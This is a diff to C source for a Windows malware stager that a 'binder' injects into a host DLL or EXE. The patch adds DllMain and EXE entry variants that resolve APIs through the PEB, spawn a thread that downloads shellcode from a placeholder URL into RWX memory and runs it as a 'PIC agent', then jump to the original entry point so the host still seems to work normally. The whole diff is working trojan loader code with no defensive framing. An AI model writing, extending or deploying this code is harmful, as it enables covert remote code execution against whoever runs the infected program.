@@ -21,6 +21,13 @@
 
 #include <intrin.h> /* provides __readgsqword / __readfsdword as inline intrinsics (no CRT) */
 
+/* Entry-point mode: exactly one of BUILD_FOR_DLL / BUILD_FOR_EXE must be defined
+ * on the compile line (see README). The binder picks the variant matching the
+ * host it injects into. */
+#if defined(BUILD_FOR_DLL) && defined(BUILD_FOR_EXE)
+#error "Define only one of BUILD_FOR_DLL or BUILD_FOR_EXE, not both."
+#endif
+
 #ifdef __x86_64__
 typedef unsigned long long uptr;
 #define PEB() ((uptr)__readgsqword(0x60))
@@ -144,42 +151,12 @@ char g_url[256] = "SHELLCODE_URL_PLACEHOLDER";
 
 static u32 download_thread(void *param)
 {
-    struct API *api = (struct API *)param;
-    void *buf = api->pVirtualAlloc(0, 0x400000, 0x3000 /*COMMIT|RESERVE*/, 0x40 /*RWX*/);
-    if (!buf)
-        return 0;
-
-    void *hInternet = api->pInternetOpenA(0, 0, 0, 0, 0);
-    if (!hInternet)
-        return 0;
-
-    void *hUrl = api->pInternetOpenUrlA(hInternet, g_url, 0, 0, 0x84000000 /*RELOAD|NO_CACHE_WRITE*/, 0);
-    if (!hUrl)
-        return 0;
-
-    uptr off = 0;
-    u32 got = 0;
-    do
-    {
-        api->pInternetReadFile(hUrl, (char *)buf + off, 0x100000, &got);
-        off += got;
-    } while (got && off < 0x400000);
-
-    if (off)
-        return ((u32 (*)(void))buf)(); /* run the PIC agent */
-    return 0;
-}
-
-/* ── Entry (placed first in .text via section attr) ───────────────────────── */
-
-__attribute__((section(".text.start"), used)) void _start(void)
-{
     struct API api;
+
     uptr k32 = kernel32_base();
     if (!k32)
-        return;
+        return 0;
 
-    api.pCreateThread = (CreateThread_t)resolve_export(k32, "CreateThread");
     api.pLoadLibraryA = (LoadLibraryA_t)resolve_export(k32, "LoadLibraryA");
 
     api.pVirtualAlloc = (VirtualAlloc_t)resolve_export(k32, "VirtualAlloc");
@@ -192,7 +169,74 @@ __attribute__((section(".text.start"), used)) void _start(void)
         api.pInternetReadFile = (InternetReadFile_t)resolve_export(wininet, "InternetReadFile");
     }
 
-    if (api.pCreateThread && api.pInternetOpenUrlA)
+    void *buf = api.pVirtualAlloc(0, 0x400000, 0x3000 /*COMMIT|RESERVE*/, 0x40 /*RWX*/);
+    if (!buf)
+        return 0;
+
+    void *hInternet = api.pInternetOpenA(0, 0, 0, 0, 0);
+    if (!hInternet)
+        return 0;
+
+    void *hUrl = api.pInternetOpenUrlA(hInternet, g_url, 0, 0, 0x84000000 /*RELOAD|NO_CACHE_WRITE*/, 0);
+    if (!hUrl)
+        return 0;
+    uptr off = 0;
+    u32 got = 0;
+    do
+    {
+        api.pInternetReadFile(hUrl, (char *)buf + off, 0x100000, &got);
+        off += got;
+    } while (got && off < 0x400000);
+
+    if (off)
+        return ((u32 (*)(void))buf)(); /* run the PIC agent */
+    return 0;
+}
+
+/* ── Entry (placed first in .text via section attr) ───────────────────────── */
+
+#if defined(BUILD_FOR_DLL)
+
+/* DLL entry: the binder wires this stub in as the host DLL's DllMain. hinstDLL
+ * is the image base; on DLL_PROCESS_ATTACH (fdwReason == 1) we spawn the stager
+ * thread, then tail-call the original DllMain at base + OEP RVA. */
+__attribute__((section(".text.start"), used)) int WINAPI _start(void *hinstDLL,
+                                                                int fdwReason,
+                                                                void *lpReserved)
+{
+    if (fdwReason == 1)
+    {
+        struct API api;
+        uptr k32 = kernel32_base();
+        if (!k32)
+            return 0;
+        api.pCreateThread = (CreateThread_t)resolve_export(k32, "CreateThread");
+
+        if (api.pCreateThread)
+            api.pCreateThread(0, 0, (u32 (*)(void *))download_thread, 0, 0, 0);
+    }
+
+    volatile char c2_oep[12] = "C2OEPRAV";   /* volatile: prevent the -O2 constant-fold that erased this marker */
+    u32 oep = *(volatile u32 *)(c2_oep + 4); /* original entry-point RVA (patched by binder) */
+    return ((int WINAPI (*)(void *, int, void *))((uptr)hinstDLL + oep))(hinstDLL, fdwReason, lpReserved);
+}
+
+#elif defined(BUILD_FOR_EXE)
+
+/* EXE entry: the binder repoints the host EXE's entry point here. An EXE entry
+ * receives no image-base argument, so derive the base from
+ * PEB.Ldr.InLoadOrderModuleList[0] (the EXE itself), spawn the stager thread,
+ * then jump to the original OEP. */
+__attribute__((section(".text.start"), used)) void _start(void)
+{
+    struct API api;
+    uptr k32 = kernel32_base();
+    if (!k32)
+        return;
+
+    api.pCreateThread = (CreateThread_t)resolve_export(k32, "CreateThread");
+
+    if (api.pCreateThread)
         api.pCreateThread(0, 0, (u32 (*)(void *))download_thread, &api, 0, 0);
 
     /* Resume the host: exe base (PEB.Ldr.InLoadOrderModuleList[0]) + patched OEP RVA. */
@@ -200,12 +244,13 @@ __attribute__((section(".text.start"), used)) void _start(void)
     uptr ldr = *(uptr *)(peb + LDR_OFF);
     uptr first = *(uptr *)(ldr + INLOAD_OFF);
     uptr base = *(uptr *)(first + DBASE_INLOAD);
-    volatile char c2_oep[12] = "C2OEPRAV"; /* volatile: prevent the -O2 constant-fold that erased this marker */
 
-    u32 oep = *(volatile u32 *)(c2_oep + 4); /* original entry-point RVA (patched by binder) */
+    volatile char c2_oep[12] = "C2OEPRAV";
+    u32 oep = *(volatile u32 *)(c2_oep + 4);
     ((void (*)(void))(base + oep))();
 
     for (;;)
     {
     } /* never reached for an EXE entry */
 }
+#endif
